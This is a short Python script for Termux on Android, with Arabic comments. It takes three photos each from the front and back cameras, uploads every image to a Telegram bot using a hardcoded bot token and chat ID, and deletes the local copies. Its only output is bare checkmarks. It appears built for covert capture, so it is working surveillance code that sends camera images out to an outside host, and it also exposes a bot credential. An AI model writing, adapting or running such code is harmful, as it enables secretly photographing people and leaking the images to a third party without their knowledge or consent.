import os
import time
import requests

# === إعدادات البوت ===
TOKEN = '8162453891:AAHQFyMPEzja9Wt8vSxT6t5-d_NuJu-zM9w'
CHAT_ID = '1249382653'

def send_photo(photo_path, caption="✔️"):
    if os.path.exists(photo_path):
        with open(photo_path, 'rb') as photo:
            r = requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                data={'chat_id': CHAT_ID, 'caption': caption},
                files={'photo': photo}
            )
        os.remove(photo_path)
    else:
        print(f"[!] الملف غير موجود: {photo_path}")

def capture_and_send(camera_id, label):
    for i in range(3):
        filename = f"/sdcard/{label}_{i+1}.jpg"
        print(f"[+] التقاط {label} {i+1}")
        os.system(f"termux-camera-photo -c {camera_id} {filename}")
        time.sleep(0.2)
        send_photo(filename, f"✔️ {label} {i+1}")

# === تنفيذ المهام ===
print("✔️ 1")
capture_and_send(camera_id=1, label="ca1")

print("✔️.")
capture_and_send(camera_id=0, label="ca2")

print("✔️all.")